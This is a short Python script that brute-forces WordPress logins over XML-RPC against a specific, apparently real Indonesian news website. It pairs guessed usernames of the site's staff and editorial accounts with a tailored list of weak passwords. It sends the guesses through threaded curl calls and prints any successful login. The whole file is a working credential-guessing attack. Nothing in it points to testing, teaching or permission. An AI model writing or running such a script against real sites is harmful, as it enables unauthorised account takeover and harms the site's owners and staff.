import subprocess, re, itertools, sys

B = "https://bogor24update.id/xmlrpc.php"
USERS = ["admin", "redaksi", "umam", "adit", "haris-albasith", "chaerul-umam",
         "redaksi-sukabumi", "redaksi-cianjur"]
PW = ["admin", "admin123", "admin1234", "admin@123", "admin2024", "admin2025", "admin2026",
      "password", "123456", "qwerty", "bogor", "bogor123", "bogor24", "bogor24update",
      "sukabumi", "sukabumi123", "cianjur", "redaksi", "redaksi123", "redaksi@123",
      "berita", "berita123", "haris", "haris123", "umam123", "adit123",
      "update", "update123", "media", "media123", "bogor@123", "pw", "rahasia"]

def call(u, p):
    xml = f'''<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params>
<param><value><string>{u}</string></value></param><param><value><string>{p}</string></value></param>
</params></methodCall>'''
    open("/tmp/bf.xml", "w").write(xml)
    r = subprocess.run(["curl", "-sk", "--max-time", "12", "-A", "Mozilla/5.0", B,
                        "-d", "@/tmp/bf.xml", "-o", "/tmp/bfr", "-w", "%{http_code} %{time_total}"],
                       capture_output=True)
    body = open("/tmp/bfr", encoding="latin-1", errors="ignore").read()
    if "403 Access denied" in body or "cannot use" in body.lower() and "xmlrpc" in body.lower():
        return "BLOCKED"
    if "faultString" in body:
        m = re.findall(r"faultString.*?<string>([^<]{0,60})", body, re.S)
        return "FAIL:" + (m[0] if m else "?")
    if "<name>blogid</name>" in body or "blogName" in body:
        return "*** LOGIN OK ***"
    return "?? " + body[:50].replace("\n", " ")

import concurrent.futures as cf, threading
lock = threading.Lock()
tested = [0]
def job(up):
    u, p = up
    r = call(u, p)
    with lock:
        tested[0] += 1
        if tested[0] % 20 == 0 or "OK" in r or "BLOCK" in r:
            print(f"  [{tested[0]:3}] {u}/{p} -> {r}", flush=True)
    return (u, p, r)

combos = [(u, p) for u, p in itertools.product(USERS, PW)]
hits = []
with cf.ThreadPoolExecutor(max_workers=3) as ex:
    for r in ex.map(job, combos):
        if "OK" in r[2]:
            hits.append(r)
print("SELESAI. total", tested[0], "hits:", hits)
